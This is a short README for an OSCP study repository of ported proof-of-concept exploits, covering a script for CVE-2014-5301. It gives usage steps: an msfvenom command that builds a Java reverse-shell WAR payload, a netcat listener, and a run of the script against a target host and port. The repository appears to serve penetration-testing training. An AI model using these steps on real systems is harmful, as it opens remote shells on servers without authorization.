# OSCP
This is a repository which contains custom/ported POC exploits. They have been made for study and learning purposes.

## 35845.py

CVE: 2014-5301

OSVDB: 116733

URL: [http://seclists.org/fulldisclosure/2015/Jan/5](http://seclists.org/fulldisclosure/2015/Jan/5)

Original metasploit module: url

### Usage
```
35845.py file.war host port
```

1. First create reverse shell payload
```
msfvenom -p java/shell_reverse_tcp LHOST=<ip address> LPORT=4444 -f war > shell.war
```
2. Start netcat listener 

3.run the script
```
35845.py shell.war 192.168.1.1 8080
```
**Note:** The exploit may require multiple run to get it working. Don't give up!
